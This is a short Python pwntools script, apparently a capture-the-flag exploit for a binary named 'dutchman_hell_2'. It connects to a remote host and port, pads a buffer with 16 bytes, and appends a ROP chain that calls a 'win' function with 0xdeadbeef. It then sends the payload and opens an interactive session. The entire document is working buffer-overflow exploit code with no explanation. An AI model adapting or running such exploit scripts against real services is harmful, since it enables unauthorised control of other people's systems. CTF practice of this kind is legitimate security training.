from pwn import *

pwnlib.context.context.clear(arch='amd64', os='linux')

r = remote("65.109.201.174", 5002)
e = pwnlib.elf.ELF('dutchman_hell_2')

rop = pwnlib.rop.rop.ROP(e)
ret_gadget = rop.find_gadget(['ret'])[0]
rop.raw(ret_gadget)
rop.call('win', [0xdeadbeef])

payload = bytearray()
payload += ('A' * (0x8 + 8)).encode('ascii')
payload += bytes(rop)

print("sending ", payload)

r.sendline(payload)

r.interactive()

r.close()
